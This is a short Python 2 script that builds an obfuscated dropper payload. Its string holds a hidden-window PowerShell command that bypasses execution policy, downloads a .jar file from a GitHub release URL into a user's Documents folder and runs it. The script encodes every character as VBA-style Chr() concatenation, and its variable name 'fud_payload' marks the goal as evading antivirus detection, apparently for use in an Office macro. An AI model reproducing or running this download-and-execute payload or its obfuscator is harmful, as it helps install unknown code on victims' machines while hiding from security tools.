payload = "(\"cmd.exe /c powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://github.com/Tyrnonix/Clicker/releases/download/v0.1/Java.Reader.jar%27,%27C:/Users/Luuk/Documents/Reader.jar%27); start C:\Users\Luuk\Documents\Reader.jar\")"

fud_payload = ""

for i in payload:
	fud_payload += "Chr(" + str(ord(i)) + ") & "

fud_payload = fud_payload[:-3]

print fud_payload